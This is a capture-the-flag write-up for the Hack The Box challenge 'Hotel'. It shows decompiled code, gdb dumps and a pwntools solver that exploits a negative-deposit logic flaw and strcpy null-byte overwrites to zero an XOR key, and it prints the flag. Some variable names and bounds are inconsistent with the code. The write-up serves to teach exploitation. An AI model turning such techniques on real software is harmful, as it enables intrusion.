# Hotel :hotel:  

### Description:
* Agent, in this hotel you are safe from everyone. You can spend or deposit your coins here. There are also some privileged areas that you can access only with a special secret passphrase. Take a rest here before you continue your missions.

### Objective:
* You can deposit a negative number and increase your money to pass the comparison.
* `strcpy` adds a null byte at the end of the string. A non-random key with zeros can be created.

### Flag:
* `HTB{u_ov3rwr0t3_th3_s3cr3t_p455phr4s3}`

### Difficulty:
* Medium

### Challenge:
We start with a `checksec`:  
```console
$ checksec ./hotel
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
All protections are **enabled**.  

The interface of the program looks like this:  
```
$ ./hotel 

💲 OverContinental Hotel 💲

Current coins: 13.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
3

No item available!

Current coins: 13.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
2

How many coins do you want to deposit?
10

Current coins: 3.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
2

How many coins do you want to deposit?
-100

Current coins: 103.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
1

Length of secret pass phrase (1-38): 9

Secret pass phrase generated successfuly!

Current coins: 103.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
```
There are 4 options:  
* Generate secret pass phrase.  
* Deposit coins.  
* Claim secret item.  
* Exit.  

We need disassembly from now on in order to better understand our program.  

#### Disassembly:

We start with `main`:
```c
void main(void)

{
  setup();
  welcome();
  generate();
  do {
    menu();
  } while( true );
}
```
We see 2 interesting functions:
* `generate`
* `menu`  

We start with `generate` that is called first.
```c
void generate(void)

{
  long in_FS_OFFSET;
  int local_44;
  int local_40;
  int local_3c;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_44 = 1;
  local_40 = 0;
  if (_flag == 0) {
    printf("\nLength of secret pass phrase (1-38): ");
    __isoc99_scanf(&DAT_0010115f,&local_44);
    if ((local_44 < 0x28) && (-1 < local_44)) {
      memset(local_38,0,(long)local_44);
      local_3c = open("/dev/urandom",0);
      if (local_3c < 0) {
        fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
        exit(0x69);
      }
      read(local_3c,local_38,(long)local_44);
      while (local_40 < local_44) {
        while (local_38[local_40] == '\0') {
          read(local_3c,local_38 + local_40,1);
        }
        local_40 = local_40 + 1;
      }
      strcpy(secret_passphrase,local_38);
      close(local_3c);
      puts("\nSecret pass phrase generated successfuly!");
    }
    else {
      puts("\nInvalid size!");
    }
  }
  else {
    _flag = 0;
    local_3c = open("/dev/urandom",0);
    if (local_3c < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_3c,secret_passphrase,0x27);
    close(local_3c);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
We see that the first time it is called (`\_flag` == 1), it opens `/dev/urandom`  and initializes `lucky_number` with 39 random bytes. If we call it again, it will prompt us to insert the length of the lucky number. The length must be between 0 and 32. It then generates a random `secret pass phrase` from `/dev/urandom` again. The bug here is with `strcpy`. This function adds a null byte to the end of the string it copies. This is explained further in the **Debugging** section.  

Analyzing `menu`:  
```c
void menu(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf((char *)(double)coins,
                  
         "\nCurrent coins: %.2f\n\n1. Generate secret pass phrase.\n2. Deposit coins.\n3. Claimsecret item.\n4. Exit.\n"
        );
  __isoc99_scanf(&DAT_0010115f,&local_14);
  if (local_14 == 2) {
    deposit();
  }
  else {
    if (local_14 < 3) {
      if (local_14 == 1) {
        generate();
        goto code_r0x00100f56;
      }
    }
    else {
      if (local_14 == 3) {
        claim();
        goto code_r0x00100f56;
      }
      if (local_14 == 4) {
        puts("Goodbye!\n");
                    /* WARNING: Subroutine does not return */
        exit(0x45);
      }
    }
    puts("Invalid option!\n");
    menu();
  }
code_r0x00100f56:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
As we saw from the interface, there are 4 options. We analyzed `generate` so, let's proceed to the other ones.  

`deposit`:  

```c
void deposit(void)

{
  int iVar1;
  long in_FS_OFFSET;
  float local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nHow many coins do you want to deposit?");
  __isoc99_scanf(&DAT_001011d0,&local_18);
  coins = coins - local_18;
  iVar1 = coin_check(coins);
  if (iVar1 != 0) {
    local_14 = open("/dev/urandom",0);
    if (local_14 < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_14,secret_passphrase2,0x37);
    close(local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
At the very beginning, you can choose how many *coins* you want to deposit.  

*coins* is a global variable representing the money you have.  Another bug can be found here. There is no limitation to what you can bet. There is a `coin_check` function:  

```c
undefined8 coin_check(float param_1)

{
  long in_FS_OFFSET;
  
  if (param_1 <= 0.0) {
    puts("\nYou are out of coins!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (*(long *)(in_FS_OFFSET + 0x28) != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(0);
  }
  return 1;
}
```
`coin_check` only checks if you run out of money. User input is not checked, thus a **negative value** can be inserted! This way, we can increase our money as much as we want. The `deposit` function also opens `/dev/urandom` and creates a random 0x37 bytes string. It then compared this with our pass phrase.  

Finally, we reach `claim`:  
```c
void claim(void)

{
  int __fd;
  long in_FS_OFFSET;
  int local_40;
  byte local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((prize_flag == 0) && (coins <= 100.0)) {
    puts("\nNo item available!");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts(&DAT_001011d3);
  local_40 = 0;
  __fd = open("./flag.txt",0);
  if (__fd < 0) {
    fwrite("\nError opening flag, exiting..\n",1,0x1f,stderr);
                    /* WARNING: Subroutine does not return */
    exit(0x22);
  }
  read(__fd,local_38,0x27);
  while (local_40 < 0x27) {
    local_38[local_40] = local_38[local_40] ^ secret_passphrase[local_40];
    local_40 = local_40 + 1;
  }
  close(__fd);
  printf("%s",local_38);
                    /* WARNING: Subroutine does not return */
  exit(2);
}
```
As we can see, in order to open the `flag.txt`, we need to pass a comparison:   
`if ((prize_flag == 0) && (cosy_coins <= 100.0))`  

However, `cosy_coins` can be increased via the bet as long as a negative input is provided. After that, `flag` is `XORED` with the `passphrase` we generated previously. In order to get the flag, we need to `XOR` it with something that will not change its value ,such as zeros.

Now that we analyzed our binary to the fullest, let's see what happens inside the debugger.  

#### Debugging:  
Running the program, we can see that lucky number is randomly generated the first time.  
```gdb
gef➤  x/6gx &secret_passphrase
0x555555756060 <secret_passphrase>:	0xdeded41cef89d05d	0xb37198cd86d73fea
0x555555756070 <secret_passphrase+16>:	0xbf9a47bbc59a3f28	0x4fa3a999fea59286
0x555555756080 <secret_passphrase+32>:	0x0034772dbf424a1a	0x0000000000000000
```
We continue to `generate` and insert 31 bytes (for example) as a length.  
```gdb
gef➤  x/6gx &secret_passphrase
0x555555756060 <secret_passphrase>:	0xd0c9c234f0f94409	0xa719ef77e24f1831
0x555555756070 <secret_passphrase+16>:	0x79645fa99458703c	0x002c1508922b9b16
0x555555756080 <secret_passphrase+32>:	0x0034772dbf424a1a
```
We continue with 30.  
```gdb
gef➤  x/6gx &secret_passphrase
0x555555756060 <secret_passphrase>:	0xcd104c1c071ef0b7	0x7155be568885dbec
0x555555756070 <secret_passphrase+16>:	0x65b9687cb5bd2cec	0x0000185b25acd31f // another null byte is added!
```
This happens because `strcpy` adds it at the end of the string.  We can do this 38 times to create a key full of zeros.  Then, the `XOR` with `flag` will result in printing the actual flag and not junk.  

In order to call `claim` we need to increase our coins.  
```gdb
gef➤  c
Continuing.
2

How many coins do you want to deposit?
-100

Current coins: 113.37

1. Generate secret pass phrase.
2. Deposit coins.
3. Claim secret item.
4. Exit.
```
We can do this easily by adding a negative number!  

To sum it up:
* Create a pseudo-random lucky number full of zeros via `generate`.
* Increase the number of coins via `deposit` by adding a negative number.  
* Get flag via `claim`.  

#### Solver:  
```python
#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1' 	# change this
port = 1337	        # change this 	
fname = './hotel'

LOCAL = False 		# change this 
if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

e = ELF(fname, checksec = False)

sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def generate():
	# Create a 38 byte long key with 0s.
	with log.progress('Generating key..') as p:
		k = 1
		i = 39
		while(i >= 0):
			p.status('{} out of {} bytes'.format(k,32))
			sla('Exit.', '1')
			sla('(1-38):', str(i))
			k += 1
			i -=1

def play():
	# Increase money in order for claim to be called.
	sla('Exit.', '2')
	sla('?', '-100')


def claim():
	# Get flag.
	sla('Exit.', '3')
	inter()

def pwn():

	generate()
	play()
	claim()

if __name__ == '__main__':
	pwn()
```

#### PoC: 
```sh
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[+] Generating key..: Done
[*] Switching to interactive mode


Mission Complete!! ✔

HTB{u_ov3rwr0t3_th3_s3cr3t_p455phr4s3}
[*] Got EOF while reading in interactive
```

